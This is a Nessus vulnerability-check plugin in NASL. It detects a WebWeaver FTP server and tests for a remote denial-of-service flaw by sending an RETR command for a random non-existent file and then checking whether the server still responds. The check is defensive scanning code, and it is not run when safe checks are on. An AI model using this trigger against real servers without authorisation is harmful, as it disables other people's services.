#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11584);
 script_bugtraq_id(7425);
 script_version ("1.19");
 
 script_name(english:"WebWeaver FTP Aborted RETR Command Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote WebWeaver FTP server can be disabled remotely
by requesting a non-existing file-name.

An attacker may use this flaw to prevent this FTP server from
executing properly." );
 script_set_attribute(attribute:"solution", value:
"None at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
 script_set_attribute(attribute:"cvss_score_source", value:"manual");
 script_set_attribute(attribute:"cvss_score_rationale", value:"score from a more in depth analysis done by Tenable");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/05/06");
 script_cvs_date("Date: 2018/11/05 14:12:07");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "disables the remote WebWeaver FTP server");
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_family(english:"FTP");
 script_dependencies("ftpserver_detect_type_nd_version.nasl");
 script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if (! banner) audit(AUDIT_NO_BANNER, port);
if("BRS WebWeaver" >!< banner) audit(AUDIT_NOT_DETECT,"WebWeaver FTP",port);

soc = open_sock_tcp(port);
if (! soc) audit(AUDIT_SOCK_FAIL,port);

  ftp_debug(str:"custom");
  d = ftp_recv_line(socket:soc);
  if(!d){
	close(soc);
	audit(AUDIT_NO_BANNER, port);
	}
  if("BRS WebWeaver" >!< d)audit(AUDIT_NOT_DETECT,"WebWeaver FTP",port);
  
  if(safe_checks())
  {
   txt = 
"Since safe checks are enabled, Nessus did not actually check for this
flaw and this might be a false positive";
  security_warning(port:port, extra: txt);
  exit(0);
  }
  
  if (report_paranoia < 2) audit(AUDIT_PARANOID);

  send(socket:soc, data: ('RETR nessus' + rand() + rand() + '\r\n'));
  r = ftp_recv_line(socket:soc);
  close(soc);
 
  soc = open_sock_tcp(port);
  if(!soc)audit(AUDIT_SOCK_FAIL,port);
  
  r = recv_line(socket:soc, length:4096);
  if(!r)security_warning(port);
  close(soc);
 
